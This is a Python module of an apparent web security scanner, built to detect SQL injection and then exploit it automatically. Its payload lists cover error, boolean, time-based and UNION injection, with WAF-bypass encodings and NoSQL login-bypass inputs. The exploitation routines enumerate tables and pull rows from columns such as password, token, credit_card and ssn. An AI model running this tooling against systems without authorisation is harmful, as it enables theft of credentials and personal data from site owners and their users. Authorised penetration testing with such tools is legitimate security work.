import re
import asyncio
import json as json_lib
from urllib.parse import quote, urljoin
from modules.base import BaseModule
from core.utils import extract_params, random_string
from core.http import inject_param


def _inject_json_param(body, param, payload):
    if isinstance(body, dict):
        out = dict(body)
        out[param] = payload
        return out
    try:
        data = json_lib.loads(body) if isinstance(body, str) else body
        data = dict(data)
        data[param] = payload
        return data
    except (TypeError, ValueError):
        return {param: payload}


class SqliModule(BaseModule):
    name = "sqli"
    description = "SQL Injection Scanner with Auto Exploitation"
    exploitable = True
    
    error_patterns = [
        (r"SQL syntax.*MySQL", "MySQL"),
        (r"Warning.*mysql_", "MySQL"),
        (r"MySqlException", "MySQL"),
        (r"valid MySQL result", "MySQL"),
        (r"check the manual that corresponds to your (MySQL|MariaDB)", "MySQL"),
        (r"MySqlClient\.", "MySQL"),
        (r"com\.mysql\.jdbc", "MySQL"),
        (r"Pdo[./_\\\\]Mysql", "MySQL"),
        (r"PostgreSQL.*ERROR", "PostgreSQL"),
        (r"Warning.*\Wpg_", "PostgreSQL"),
        (r"valid PostgreSQL result", "PostgreSQL"),
        (r"Npgsql\.", "PostgreSQL"),
        (r"PG::SyntaxError:", "PostgreSQL"),
        (r"org\.postgresql\.util\.PSQLException", "PostgreSQL"),
        (r"ERROR:\s+syntax error at or near", "PostgreSQL"),
        (r"Driver.*SQL[\-\_\ ]*Server", "MSSQL"),
        (r"OLE DB.*SQL Server", "MSSQL"),
        (r"SQLServer JDBC Driver", "MSSQL"),
        (r"Microsoft SQL Native Client error", "MSSQL"),
        (r"\[SQL Server\]", "MSSQL"),
        (r"ODBC SQL Server Driver", "MSSQL"),
        (r"SQLSrv", "MSSQL"),
        (r"Unclosed quotation mark after the character string", "MSSQL"),
        (r"ORA-[0-9]{5}", "Oracle"),
        (r"Oracle error", "Oracle"),
        (r"Oracle.*Driver", "Oracle"),
        (r"Warning.*\Woci_", "Oracle"),
        (r"Warning.*\Wora_", "Oracle"),
        (r"oracle\.jdbc\.driver", "Oracle"),
        (r"quoted string not properly terminated", "Oracle"),
        (r"CLI Driver.*DB2", "DB2"),
        (r"DB2 SQL error", "DB2"),
        (r"SQLite.*error", "SQLite"),
        (r"sqlite3\.OperationalError", "SQLite"),
        (r"SQLite\.Exception", "SQLite"),
        (r"System\.Data\.SQLite\.SQLiteException", "SQLite"),
        (r"Warning.*sqlite_", "SQLite"),
        (r"Warning.*SQLite3::", "SQLite"),
        (r"\[SQLITE_ERROR\]", "SQLite"),
        (r"SQLSTATE\[", "Unknown"),
        (r"Unclosed quotation mark", "Unknown"),
        (r"syntax error at or near", "Unknown"),
        (r"Unterminated string literal", "Unknown"),
        (r"division by zero", "Unknown"),
        (r"Unknown column", "Unknown"),
        (r"Invalid column name", "Unknown"),
        (r"Query failed", "Unknown"),
    ]
    
    time_payloads = {
        "MySQL": [
            ("' AND SLEEP({time})-- ", 5),
            ("' OR SLEEP({time})-- ", 5),
            ("\" AND SLEEP({time})-- ", 5),
            ("') AND SLEEP({time})-- ", 5),
            ("' AND (SELECT * FROM (SELECT SLEEP({time}))a)-- ", 5),
            ("' AND BENCHMARK(10000000,SHA1('test'))-- ", 3),
            ("1' AND SLEEP({time})-- ", 5),
            ("1) AND SLEEP({time})-- ", 5),
        ],
        "MSSQL": [
            ("'; WAITFOR DELAY '00:00:0{time}'-- ", 5),
            ("' WAITFOR DELAY '00:00:0{time}'-- ", 5),
            ("'); WAITFOR DELAY '00:00:0{time}'-- ", 5),
            ("1; WAITFOR DELAY '00:00:0{time}'-- ", 5),
        ],
        "PostgreSQL": [
            ("' AND pg_sleep({time})-- ", 5),
            ("' OR pg_sleep({time})-- ", 5),
            ("'; SELECT pg_sleep({time})-- ", 5),
            ("' || pg_sleep({time})-- ", 5),
            ("1 AND pg_sleep({time})-- ", 5),
        ],
        "Oracle": [
            ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{time})=1-- ", 5),
            ("' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{time})=1-- ", 5),
            ("' AND 1=DBMS_LOCK.SLEEP({time})-- ", 5),
        ],
        "SQLite": [
            ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- ", 3),
        ],
    }
    
    schema_queries = {
        "MySQL": {
            "version": "@@version",
            "current_db": "database()",
            "current_user": "user()",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' LIMIT {offset},1",
            "data": "SELECT {column} FROM {table} LIMIT {offset},1",
            "concat": "CONCAT({args})",
            "concat_sep": "0x7c",
        },
        "PostgreSQL": {
            "version": "version()",
            "current_db": "current_database()",
            "current_user": "current_user",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset}",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT 1 OFFSET {offset}",
            "data": "SELECT {column} FROM {table} LIMIT 1 OFFSET {offset}",
            "concat": "CONCAT({args})",
            "concat_sep": "CHR(124)",
        },
        "MSSQL": {
            "version": "@@version",
            "current_db": "DB_NAME()",
            "current_user": "SYSTEM_USER",
            "tables": "SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP {offset} name FROM sysobjects WHERE xtype='U')",
            "columns": "SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('{table}') AND name NOT IN (SELECT TOP {offset} name FROM syscolumns WHERE id=OBJECT_ID('{table}'))",
            "data": "SELECT TOP 1 {column} FROM {table} WHERE {column} NOT IN (SELECT TOP {offset} {column} FROM {table})",
            "tables_agg": "SELECT STRING_AGG(CAST(name AS NVARCHAR(MAX)), ',') FROM sysobjects WHERE xtype='U'",
            "columns_agg": "SELECT STRING_AGG(CAST(name AS NVARCHAR(MAX)), ',') FROM syscolumns WHERE id=OBJECT_ID('{table}')",
            "data_agg": "SELECT STRING_AGG(CAST({column} AS NVARCHAR(MAX)), ',') FROM {table}",
            "concat": "CONCAT({args})",
            "concat_sep": "CHAR(124)",
        },
        "SQLite": {
            "version": "sqlite_version()",
            "current_db": "'main'",
            "current_user": "'sqlite'",
            "tables": "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {offset}",
            "columns": "SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {offset}",
            "data": "SELECT {column} FROM {table} LIMIT 1 OFFSET {offset}",
            "concat": "({args})",
            "concat_sep": "'|'",
        },
    }
    
    waf_bypasses = [
        lambda p: p,
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace(" ", "%09"),
        lambda p: p.replace(" ", "%0a"),
        lambda p: p.replace("'", "%27"),
        lambda p: p.replace(" ", "%00"),
        lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN").replace("AND", "AnD"),
        lambda p: p.replace("SELECT", "/*!50000SELECT*/").replace("UNION", "/*!50000UNION*/"),
    ]
    
    interesting_tables = ["users", "admin", "accounts", "members", "credentials", "passwords", "login", "customers"]
    interesting_columns = ["password", "passwd", "pass", "pwd", "secret", "hash", "token", "api_key", "credit_card", "ssn", "email", "username", "user", "admin"]
    json_body_params = ["emailID", "email", "username", "user", "id", "search", "q", "query", "name", "value", "data", "input", "filter", "key"]
    
    async def scan(self, target):
        self.findings = []
        self.detected_db = None
        self.injectable_param = None
        self.injectable_payload = None
        self.union_columns = 0
        self.extracted_data = {}
        self.body_json_sqli = False
        self._json_baseline_body = None
        
        params = extract_params(target)
        
        if not params:
            vuln = await self._test_json_body_sqli(target)
            if not vuln:
                await self._test_path_sqli(target)
            if self.injectable_param and self.body_json_sqli:
                self.log(f"[SQLi] Vulnerability confirmed (JSON body)! Starting exploitation...")
                await self._exploit_sqli(target)
            await self._test_header_sqli(target)
            await self._test_nosql(target)
            return self.findings
        
        self.log(f"[SQLi] Testing {len(params)} parameters...")
        
        vuln_found = await self._detect_sqli(target, params)
        
        if vuln_found:
            self.log(f"[SQLi] Vulnerability confirmed! Starting exploitation...")
            await self._exploit_sqli(target)
        
        await self._test_header_sqli(target)
        await self._test_nosql(target)
        
        return self.findings
    
    async def _req_param(self, target, param, payload):
        if self.body_json_sqli:
            body = _inject_json_param(self._json_baseline_body or {param: ""}, param, payload)
            return await self.http.post(target, json=body, headers={"Content-Type": "application/json"})
        test_url = inject_param(target, param, payload)
        return await self.http.get(test_url)
    
    async def _baseline_for_param(self, target, param):
        if self.body_json_sqli:
            body = self._json_baseline_body or {param: "1"}
            return await self.http.post(target, json=body, headers={"Content-Type": "application/json"})
        return await self.http.get(target)
    
    async def _test_json_body_sqli(self, target):
        self.log("[SQLi] Testing JSON body parameters...")
        for param in self.json_body_params:
            base_body = {param: "1"}
            self._json_baseline_body = base_body
            self.body_json_sqli = True
            self.injectable_param = param
            if await self._test_error_based_json(target, param):
                return True
            if await self._test_boolean_based_json(target, param):
                return True
            if await self._test_time_based_json(target, param):
                return True
        self.body_json_sqli = False
        self.injectable_param = None
        self._json_baseline_body = None
        return False
    
    async def _test_error_based_json(self, target, param):
        payloads = ["'", "\"", "' OR '1'='1", "1'", "' AND 1=CONVERT(int,(SELECT @@version))-- "]
        
        if self.aggressive:
            from core.fuzzer import MutationEngine
            mutator = MutationEngine()
            mutated = []
            for p in payloads:
                mutated.extend(mutator.mutate_string(p, count=3))
            payloads = list(dict.fromkeys(payloads + mutated))[:30]
        
        for payload in payloads:
            for bypass in self.waf_bypasses[:3]:
                test_payload = bypass(payload)
                resp = await self._req_param(target, param, test_payload)
                if resp.get("status"):
                    for pattern, db_type in self.error_patterns:
                        if re.search(pattern, resp["text"], re.IGNORECASE):
                            self.detected_db = db_type
                            self.injectable_payload = test_payload
                            self.record_success(test_payload, target)
                            
                            confidence_evidence = ["error_message", "json_body_injection"]
                            if db_type != "Unknown":
                                confidence_evidence.append("database_fingerprint")
                            
                            self.add_finding(
                                "CRITICAL",
                                f"Error-based SQL Injection ({db_type}) in JSON body",
                                url=target,
                                parameter=param,
                                evidence=f"Database: {db_type}, Key: {param}",
                                confidence_evidence=confidence_evidence,
                                request_data={"method": "POST", "url": target, "json": {param: test_payload}},
                                response_data={"status": resp.get("status"), "text": resp.get("text", "")[:500]}
                            )
                            return True
        return False
    
    async def _test_boolean_based_json(self, target, param):
        test_cases = [
            ("' OR '1'='1'-- ", "' AND '1'='2'-- "),
            ("' OR 1=1-- ", "' AND 1=2-- "),
            ("\" OR \"1\"=\"1", "\" AND \"1\"=\"2"),
        ]
        for true_payload, false_payload in test_cases:
            true_responses = []
            false_responses = []
            
            for _ in range(2):
                true_resp = await self._req_param(target, param, true_payload)
                false_resp = await self._req_param(target, param, false_payload)
                if true_resp.get("status") and false_resp.get("status"):
                    true_responses.append(true_resp)
                    false_responses.append(false_resp)
            
            if len(true_responses) < 2:
                continue
            
            behavior = self.detect_boolean_behavior(true_responses, false_responses)
            
            if behavior and behavior.get("is_boolean_behavior"):
                self.injectable_payload = true_payload
                
                confidence_evidence = ["response_difference", "json_body_injection"]
                if behavior.get("indicator") == "length":
                    confidence_evidence.append("length_difference")
                
                self.add_finding(
                    "HIGH",
                    "Boolean-based Blind SQL Injection in JSON body",
                    url=target,
                    parameter=param,
                    evidence=f"Indicator: {behavior.get('indicator')}, Confidence: {behavior.get('confidence', 0):.0%}",
                    confidence_evidence=confidence_evidence,
                    request_data={"method": "POST", "url": target, "json": {param: true_payload}}
                )
                return True
        return False
    
    async def _test_time_based_json(self, target, param):
        baseline_samples = []
        for _ in range(3):
            baseline = await self._req_param(target, param, "1")
            if baseline.get("status"):
                baseline_samples.append(baseline)
        
        if len(baseline_samples) < 2:
            return False
        
        avg_baseline = sum(r.get("elapsed", 0) for r in baseline_samples) / len(baseline_samples)
        
        for db_type in ["MySQL", "MSSQL", "PostgreSQL"]:
            payloads = self.time_payloads.get(db_type, [])
            for payload_template, delay in payloads[:2]:
                payload = payload_template.format(time=delay)
                
                timed_responses = []
                for _ in range(2):
                    resp = await self._req_param(target, param, payload)
                    if resp.get("status"):
                        timed_responses.append(resp)
                
                if not timed_responses:
                    continue
                
                anomaly = self.detect_time_anomaly(timed_responses, avg_baseline)
                
                if anomaly and anomaly.get("is_anomaly"):
                    avg_delay = anomaly.get("avg_time", 0)
                    if avg_delay >= delay * 0.8:
                        self.detected_db = db_type
                        self.injectable_payload = payload
                        
                        confidence_evidence = ["time_delay", "json_body_injection"]
                        if avg_delay >= delay:
                            confidence_evidence.append("exact_delay_match")
                        
                        self.add_finding(
                            "CRITICAL",
                            f"Time-based Blind SQL Injection ({db_type}) in JSON body",
                            url=target,
                            parameter=param,
                            evidence=f"Avg delay: {avg_delay:.2f}s (expected: {delay}s, baseline: {avg_baseline:.2f}s)",
                            confidence_evidence=confidence_evidence,
                            request_data={"method": "POST", "url": target, "json": {param: payload}}
                        )
                        return True
        return False
    
    async def _detect_sqli(self, target, params):
        for param in params:
            if await self._test_error_based(target, param):
                return True
            if await self._test_boolean_based(target, param):
                return True
            if await self._test_time_based(target, param):
                return True
        return False
    
    async def _test_error_based(self, target, param):
        file_payloads = (self.get_payloads("sqli") or []) + (self.get_payloads("sqli_advanced") or [])
        payloads = list(dict.fromkeys(file_payloads + [
            "'", "\"", "' OR '1'='1", "1'", "1\"", "')", "'))",
            "' AND 1=CONVERT(int,(SELECT @@version))-- ",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- ",
        ]))[:80]
        
        if self.aggressive:
            from core.fuzzer import MutationEngine
            mutator = MutationEngine()
            mutated = []
            for p in payloads[:20]:
                mutated.extend(mutator.mutate_string(p, count=3))
            payloads = list(dict.fromkeys(payloads + mutated))[:120]
        
        for payload in payloads:
            for bypass in self.waf_bypasses[:3]:
                test_payload = bypass(payload)
                resp = await self.test_param(target, param, test_payload)
                
                if resp.get("status"):
                    for pattern, db_type in self.error_patterns:
                        if re.search(pattern, resp["text"], re.IGNORECASE):
                            self.detected_db = db_type
                            self.injectable_param = param
                            self.injectable_payload = test_payload
                            self.record_success(test_payload, target)
                            
                            confidence_evidence = ["error_message", "database_fingerprint"]
                            if db_type != "Unknown":
                                confidence_evidence.append("specific_dbms")
                            
                            self.add_finding(
                                "CRITICAL",
                                f"Error-based SQL Injection ({db_type})",
                                url=target,
                                parameter=param,
                                evidence=f"Database: {db_type}, Error triggered with: {test_payload[:50]}",
                                confidence_evidence=confidence_evidence,
                                request_data={"method": "GET", "url": target, "param": param, "payload": test_payload},
                                response_data={"status": resp.get("status"), "text": resp.get("text", "")[:500]}
                            )
                            return True
        return False
    
    async def _test_boolean_based(self, target, param):
        test_cases = [
            ("' OR '1'='1'-- ", "' AND '1'='2'-- "),
            ("' OR 1=1-- ", "' AND 1=2-- "),
            ("1 OR 1=1", "1 AND 1=2"),
            ("\" OR \"1\"=\"1", "\" AND \"1\"=\"2"),
            ("1) OR (1=1", "1) AND (1=2"),
        ]
        
        await self.establish_baseline(target)
        
        for true_payload, false_payload in test_cases:
            true_responses = []
            false_responses = []
            
            for _ in range(2):
                true_resp = await self.test_param(target, param, true_payload)
                false_resp = await self.test_param(target, param, false_payload)
                
                if true_resp.get("status") and false_resp.get("status"):
                    true_responses.append(true_resp)
                    false_responses.append(false_resp)
            
            if len(true_responses) < 2:
                continue
            
            behavior = self.detect_boolean_behavior(true_responses, false_responses)
            
            if behavior and behavior.get("is_boolean_behavior"):
                self.injectable_param = param
                self.injectable_payload = true_payload
                
                confidence_evidence = ["response_difference", "consistent_behavior"]
                if behavior.get("indicator") == "length":
                    confidence_evidence.append("length_difference")
                elif behavior.get("indicator") == "status":
                    confidence_evidence.append("status_difference")
                
                self.add_finding(
                    "HIGH",
                    "Boolean-based Blind SQL Injection",
                    url=target,
                    parameter=param,
                    evidence=f"Indicator: {behavior.get('indicator')}, Confidence: {behavior.get('confidence', 0):.0%}",
                    confidence_evidence=confidence_evidence,
                    request_data={"method": "GET", "url": target, "param": param, "payload": true_payload}
                )
                return True
        
        return False
    
    async def _test_time_based(self, target, param):
        baseline_samples = []
        for _ in range(3):
            baseline = await self.http.timed_get(target)
            if baseline.get("status"):
                baseline_samples.append(baseline)
        
        if len(baseline_samples) < 2:
            return False
        
        avg_baseline = sum(r.get("elapsed", 0) for r in baseline_samples) / len(baseline_samples)
        
        db_types = ["MySQL", "MSSQL", "PostgreSQL", "SQLite"]
        if self.detected_db:
            db_types = [self.detected_db] + [d for d in db_types if d != self.detected_db]
        
        for db_type in db_types:
            payloads = self.time_payloads.get(db_type, [])
            
            for payload_template, delay in payloads[:2]:
                payload = payload_template.format(time=delay)
                test_url = inject_param(target, param, payload)
                
                timed_responses = []
                for _ in range(2):
                    resp = await self.http.timed_get(test_url)
                    if resp.get("status"):
                        timed_responses.append(resp)
                
                if not timed_responses:
                    continue
                
                anomaly = self.detect_time_anomaly(timed_responses, avg_baseline)
                
                if anomaly and anomaly.get("is_anomaly"):
                    avg_delay = anomaly.get("avg_time", 0)
                    
                    if avg_delay >= delay * 0.8:
                        self.detected_db = db_type
                        self.injectable_param = param
                        self.injectable_payload = payload
                        
                        confidence_evidence = ["time_delay", "consistent_delay"]
                        if avg_delay >= delay:
                            confidence_evidence.append("exact_delay_match")
                        
                        self.add_finding(
                            "CRITICAL",
                            f"Time-based Blind SQL Injection ({db_type})",
                            url=target,
                            parameter=param,
                            evidence=f"Avg delay: {avg_delay:.2f}s (expected: {delay}s, baseline: {avg_baseline:.2f}s)",
                            confidence_evidence=confidence_evidence,
                            request_data={"method": "GET", "url": target, "param": param, "payload": payload}
                        )
                        return True
        
        return False
    
    async def _exploit_sqli(self, target):
        if not self.injectable_param:
            return
        
        if await self._exploit_union(target):
            return
        
        if self.detected_db and await self._exploit_error_based(target):
            return
        
        await self._exploit_blind(target)
    
    async def _exploit_union(self, target):
        self.log("[SQLi] Enumerating columns for UNION...")
        
        marker = f"LNTRN{random_string(8)}SQLI"
        
        for num_cols in range(1, 20):
            nulls = ",".join(["NULL"] * num_cols)
            marker_nulls = ",".join([f"'{marker}'" if i == 0 else "NULL" for i in range(num_cols)])
            
            payloads = [
                (f"' UNION SELECT {nulls}-- ", f"' UNION SELECT {marker_nulls}-- "),
                (f"' UNION ALL SELECT {nulls}-- ", f"' UNION ALL SELECT {marker_nulls}-- "),
                (f"\" UNION SELECT {nulls}-- ", f"\" UNION SELECT {marker_nulls}-- "),
                (f"') UNION SELECT {nulls}-- ", f"') UNION SELECT {marker_nulls}-- "),
                (f"1 UNION SELECT {nulls}-- ", f"1 UNION SELECT {marker_nulls}-- "),
                (f"-1 UNION SELECT {nulls}-- ", f"-1 UNION SELECT {marker_nulls}-- "),
                (f"' UNION SELECT {nulls}#", f"' UNION SELECT {marker_nulls}#"),
            ]
            
            for payload, marker_payload in payloads:
                resp = await self._req_param(target, self.injectable_param, payload)
                
                if resp.get("status") == 200:
                    has_error = any(re.search(p[0], resp.get("text", ""), re.IGNORECASE) for p in self.error_patterns)
                    
                    if not has_error:
                        marker_resp = await self._req_param(target, self.injectable_param, marker_payload)
                        if marker in marker_resp.get("text", ""):
                            self.union_columns = num_cols
                            self.log(f"[SQLi] Found {num_cols} columns (marker confirmed)!")
                            await self._union_extract_data(target, payload, num_cols)
                            return True
                        
                        self.union_columns = num_cols
                        self.log(f"[SQLi] Found {num_cols} columns!")
                        await self._union_extract_data(target, payload, num_cols)
                        return True
        
        return False
    
    async def _union_extract_data(self, target, base_payload, num_cols):
        db_type = self.detected_db or "MySQL"
        schema = self.schema_queries.get(db_type, self.schema_queries["MySQL"])
        
        extracted = {"database": db_type, "version": None, "current_db": None, "tables": [], "data": {}}
        
        def make_extraction_payload(query):
            cols = ["NULL"] * num_cols
            cols[0] = f"({query})"
            return base_payload.replace(",".join(["NULL"] * num_cols), ",".join(cols))
        
        try:
            payload = make_extraction_payload(schema["version"])
            resp = await self._req_param(target, self.injectable_param, payload)
            if resp.get("status") == 200:
                version_match = re.search(r'(\d+\.\d+\.\d+[-\w]*)', resp.get("text", ""))
                if version_match:
                    extracted["version"] = version_match.group(1)
                    self.log(f"[SQLi] Version: {extracted['version']}")
        except:
            pass
        
        try:
            payload = make_extraction_payload(schema["current_db"])
            resp = await self._req_param(target, self.injectable_param, payload)
            if resp.get("status") == 200:
                text = resp.get("text", "")
                baseline = await self._baseline_for_param(target, self.injectable_param)
                baseline_text = baseline.get("text", "")
                new_words = set(re.findall(r'\b\w+\b', text)) - set(re.findall(r'\b\w+\b', baseline_text))
                if new_words:
                    db_names = [w for w in new_words if len(w) > 2 and w.lower() not in ['null', 'none', 'true', 'false']]
                    if db_names:
                        extracted["current_db"] = db_names[0]
                        self.log(f"[SQLi] Database: {extracted['current_db']}")
        except:
            pass
        
        self.log("[SQLi] Enumerating tables...")
        for i in range(20):
            try:
                query = schema["tables"].format(offset=i)
                payload = make_extraction_payload(query)
                resp = await self._req_param(target, self.injectable_param, payload)
                
                if resp.get("status") == 200:
                    text = resp.get("text", "")
                    for interesting in self.interesting_tables:
                        if interesting.lower() in text.lower():
                            if interesting not in extracted["tables"]:
                                extracted["tables"].append(interesting)
                                self.log(f"[SQLi] Found table: {interesting}")
                    
                    table_matches = re.findall(r'\b([a-z_][a-z0-9_]*)\b', text.lower())
                    for t in table_matches:
                        if t not in extracted["tables"] and len(t) > 2 and t not in ['null', 'the', 'and', 'for']:
                            if any(kw in t for kw in ['user', 'admin', 'account', 'member', 'customer', 'order', 'product']):
                                extracted["tables"].append(t)
                else:
                    break
            except:
                break
        
        async def check_column(table, col):
            try:
                query = f"SELECT {col} FROM {table} LIMIT 1"
                payload = make_extraction_payload(query)
                resp = await self._req_param(target, self.injectable_param, payload)
                if resp.get("status") == 200 and "error" not in resp.get("text", "").lower():
                    return col
            except:
                pass
            return None
        
        for table in extracted["tables"][:5]:
            self.log(f"[SQLi] Extracting from {table}...")
            extracted["data"][table] = []
            
            column_checks = [check_column(table, col) for col in self.interesting_columns]
            results = await asyncio.gather(*column_checks, return_exceptions=True)
            columns = [c for c in results if c and not isinstance(c, Exception)]
            
            if columns:
                for i in range(5):
                    try:
                        col_str = ",".join(columns[:3])
                        query = f"SELECT CONCAT({col_str}) FROM {table} LIMIT 1 OFFSET {i}"
                        payload = make_extraction_payload(query)
                        resp = await self._req_param(target, self.injectable_param, payload)
                        if resp.get("status") == 200:
                            text = resp.get("text", "")
                            data_match = re.search(r'([a-zA-Z0-9@._-]+:[a-zA-Z0-9@._-]+)', text)
                            if data_match:
                                extracted["data"][table].append(data_match.group(1))
                    except:
                        break
        
        if extracted["version"] or extracted["tables"] or extracted["data"]:
            evidence_parts = []
            if extracted["version"]:
                evidence_parts.append(f"Version: {extracted['version']}")
            if extracted["current_db"]:
                evidence_parts.append(f"Database: {extracted['current_db']}")
            if extracted["tables"]:
                evidence_parts.append(f"Tables: {', '.join(extracted['tables'][:5])}")
            
            for table, rows in extracted["data"].items():
                if rows:
                    evidence_parts.append(f"Data from {table}: {rows[0][:50]}...")
            
            self.add_finding(
                "CRITICAL",
                "SQL Injection - Data Extracted!",
                url=target,
                parameter=self.injectable_param,
                evidence=" | ".join(evidence_parts)
            )
            
            self.extracted_data = extracted
            return True
        
        return False
    
    async def _exploit_error_based(self, target):
        if self.detected_db not in ["MySQL", "MSSQL", "Oracle"]:
            return False
        
        payloads = []
        
        if self.detected_db == "MySQL":
            payloads = [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}),0x7e))-- ",
                "' AND UPDATEXML(1,CONCAT(0x7e,({query}),0x7e),1)-- ",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({query}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
            ]
        elif self.detected_db == "MSSQL":
            payloads = [
                "' AND 1=CONVERT(int,({query}))-- ",
                "' AND 1=CAST(({query}) AS int)-- ",
            ]
        
        for payload_template in payloads:
            query = self.schema_queries.get(self.detected_db, {}).get("version", "@@version")
            payload = payload_template.format(query=query)
            
            resp = await self._req_param(target, self.injectable_param, payload)
            if resp.get("status"):
                text = resp.get("text", "")
                version_match = re.search(r'~([^~]+)~|XPATH[^:]*: \'([^\']+)\'', text)
                if version_match:
                    version = version_match.group(1) or version_match.group(2)
                    self.add_finding(
                        "CRITICAL",
                        f"Error-based SQLi - Data Extracted ({self.detected_db})",
                        url=target,
                        parameter=self.injectable_param,
                        evidence=f"Version: {version}"
                    )
                    return True
        
        return False
    
    async def _blind_extract_string(self, target, subquery, max_len=200):
        out = ""
        for pos in range(1, max_len + 1):
            found = False
            for char_code in list(range(97, 123)) + list(range(48, 58)) + [44, 46, 32, 95]:
                payload = f"' AND ASCII(LOWER(SUBSTRING(({subquery}),{pos},1)))={char_code} and '1'='1"
                resp = await self._req_param(target, self.injectable_param, payload)
                if self._blind_check_true(resp):
                    out += chr(char_code)
                    found = True
                    break
            if not found:
                break
        return out
    
    async def _exploit_blind(self, target):
        self.log("[SQLi] Starting blind extraction (slow)...")
        self._blind_false_body = None
        if self.body_json_sqli:
            false_resp = await self._req_param(target, self.injectable_param, "' AND '1'='2")
            if false_resp.get("status") and len(false_resp.get("text", "")) < 500:
                self._blind_false_body = false_resp.get("text", "")
        
        version = ""
        schema = self.schema_queries.get(self.detected_db or "MySQL", self.schema_queries["MySQL"])
        use_agg = self.detected_db == "MSSQL" and "tables_agg" in schema
        
        if use_agg:
            tables_agg_query = schema["tables_agg"]
            extracted = await self._blind_extract_string(target, tables_agg_query, max_len=150)
            if extracted:
                self.extracted_data.setdefault("tables_agg", []).append(extracted)
                tables = [t.strip() for t in extracted.split(",") if t.strip()]
                self.extracted_data.setdefault("tables", []).extend(tables)
                self.add_finding(
                    "CRITICAL",
                    "Blind SQLi - Tables Extracted via STRING_AGG (MSSQL/Azure)",
                    url=target,
                    parameter=self.injectable_param,
                    evidence=f"Tables: {extracted[:200]}"
                )
                return True
        
        for pos in range(1, 30):
            found = False
            
            for char_code in range(32, 127):
                if self.detected_db == "MySQL":
                    condition = f"ASCII(SUBSTRING(@@version,{pos},1))={char_code}"
                elif self.detected_db == "MSSQL":
                    condition = f"ASCII(SUBSTRING(@@version,{pos},1))={char_code}"
                elif self.detected_db == "PostgreSQL":
                    condition = f"ASCII(SUBSTRING(version(),{pos},1))={char_code}"
                else:
                    condition = f"ASCII(SUBSTR(sqlite_version(),{pos},1))={char_code}"
                
                payload = f"' AND {condition}-- "
                resp = await self._req_param(target, self.injectable_param, payload)
                
                if self._blind_check_true(resp):
                    version += chr(char_code)
                    found = True
                    break
            
            if not found:
                break
            
            if len(version) >= 10:
                break
        
        if version:
            self.add_finding(
                "CRITICAL",
                f"Blind SQLi - Version Extracted ({self.detected_db})",
                url=target,
                parameter=self.injectable_param,
                evidence=f"Version (partial): {version}"
            )
            return True
        
        return False
    
    def _blind_check_true(self, resp):
        if not resp.get("status"):
            return False
        text = resp.get("text", "")
        if getattr(self, "_blind_false_body", None) is not None and len(text) < 500:
            return text.strip() != self._blind_false_body.strip()
        return len(text) > 500
    
    async def _test_header_sqli(self, target):
        headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For", "Cookie", "X-Custom-Header"]
        
        for header in headers_to_test:
            payloads = ["'", "' OR '1'='1", "' AND SLEEP(2)-- "]
            
            for payload in payloads:
                resp = await self.http.get(target, headers={header: payload})
                
                if resp.get("status"):
                    for pattern, db_type in self.error_patterns:
                        if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
                            self.add_finding(
                                "CRITICAL",
                                f"SQL Injection in {header} header ({db_type})",
                                url=target,
                                parameter=header,
                                evidence=f"Header injection with: {payload}"
                            )
                            return
    
    async def _test_nosql(self, target):
        nosql_payloads = [
            ('{"$gt": ""}', "json"),
            ('{"$ne": null}', "json"),
            ('{"$ne": ""}', "json"),
            ('{"$where": "1==1"}', "json"),
            ('{"$regex": ".*"}', "json"),
            ("true, $where: '1 == 1'", "form"),
            ("'; return true; var foo='", "form"),
        ]
        
        for payload, content_type in nosql_payloads:
            try:
                if content_type == "json":
                    resp = await self.http.post(target, json={"username": payload, "password": payload}, headers={"Content-Type": "application/json"})
                else:
                    resp = await self.http.post(target, data={"username": payload, "password": payload})
                
                if resp.get("status") == 200:
                    text = resp.get("text", "").lower()
                    if any(x in text for x in ["welcome", "dashboard", "logged in", "success", "token"]):
                        self.add_finding(
                            "CRITICAL",
                            "NoSQL Injection - Authentication Bypass",
                            url=target,
                            evidence=f"Payload: {payload[:50]}"
                        )
                        return
            except:
                pass
    
    async def _test_path_sqli(self, target):
        payloads = ["'", "\"", "' OR '1'='1", "1'", "1;--"]
        
        for payload in payloads:
            test_url = urljoin(target, quote(payload))
            
            try:
                resp = await self.http.get(test_url)
                
                if resp.get("status"):
                    for pattern, db_type in self.error_patterns:
                        if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
                            self.add_finding(
                                "HIGH",
                                f"Path-based SQL Injection ({db_type})",
                                url=target,
                                evidence=f"Triggered with path: {payload}"
                            )
                            return
            except:
                pass
